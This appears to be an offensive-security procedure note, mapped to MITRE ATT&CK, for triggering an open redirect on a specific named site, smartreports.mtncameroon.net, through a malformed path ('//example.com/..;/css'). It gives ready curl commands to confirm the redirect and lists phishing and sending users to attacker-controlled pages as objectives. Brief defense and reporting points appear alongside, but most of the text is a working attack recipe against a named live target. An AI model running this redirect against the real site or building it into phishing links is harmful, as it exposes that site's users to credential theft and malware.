---
id: proc-open-redirect-trigger
tags:
  - open-redirect
  - url-manipulation
  - phishing-enabler
type: procedure
tools: []
tactics:
  - '[[Initial Access]]'
commands:
  - '[[commands/curl-follow-redirect]]'
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Exploit Public-Facing Application]]'
  - '[[Phishing]]'
updated_at: '2025-12-14T17:24:30.588Z'
skill_level: beginner
impact_level: medium
detection_risk: low
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Initial Access]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
  - '[[Phishing]]'
---
# Trigger-Open-Redirect-via-Malformed-URL-Path

## Summary

This procedure exploits an open redirection vulnerability by crafting a malformed URL path on the target website, causing the server to redirect users to arbitrary external domains. It is primarily used in phishing campaigns to trick users into visiting malicious sites hosted on attacker-controlled domains.

## Description

The target https://smartreports.mtncameroon.net fails to properly validate or sanitize URL paths, allowing attackers to inject external domains into the path using constructs like //example.com/..;/css. This bypasses intended routing and triggers a redirect, potentially exposing users to phishing pages, malware downloads, or credential harvesting. The vulnerability stems from inadequate input sanitization in the web application's redirect logic, making it exploitable without authentication from an external network position.

## Requirements

1. Public access to the target website (https://smartreports.mtncameroon.net)
2. A web browser or command-line tool like curl for testing
3. Control over an external domain (e.g., example.com) to redirect to
4. Basic understanding of URL encoding and path traversal

## Defense

Defensive measures and detection strategies:

- Implement strict URL validation to whitelist allowed domains and block external redirects
- Use Content Security Policy (CSP) headers to restrict navigation to trusted origins
- Monitor server logs for anomalous path patterns like //external.com/..;
- Employ Web Application Firewalls (WAF) to detect and block malformed URL requests

## Objectives

1. Redirect legitimate users to attacker-controlled malicious websites
2. Facilitate phishing attacks by mimicking trusted sites
3. Demonstrate the vulnerability for reporting and remediation

## Instructions

### Step 1: Craft the Malformed URL

**Context**: Construct a URL that embeds the target external domain in the path to exploit the redirection flaw.

**Command** ([[commands/curl-follow-redirect]]):
```bash
curl -L -v "https://smartreports.mtncameroon.net//example.com/..;/css"
```

> This command follows redirects (-L) and provides verbose output (-v) to show the Location header pointing to http://example.com. The path //example.com/..;/css uses path traversal (..;) to confuse the parser into treating example.com as the redirect target.

### Step 2: Access the URL and Verify Redirection

**Context**: Navigate to the crafted URL in a browser or via curl to confirm the redirect occurs without errors.

**Command** ([[commands/curl-follow-redirect]]):
```bash
curl -L "https://smartreports.mtncameroon.net//example.com/..;/css" -o /dev/null -w "%{url_effective}\n"
```

> This outputs the final effective URL after redirection, confirming success if it matches the external domain. In a browser, simply enter the URL and observe the location change.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]]

### Techniques

- [[Exploit Public-Facing Application]]
- [[Phishing]]

### Sub-Techniques


## Commands Used

- [[commands/curl-follow-redirect]]

## Tools Used


## Tags

- [[open-redirect]]
- [[Phishing]]
- [[web-vuln]]
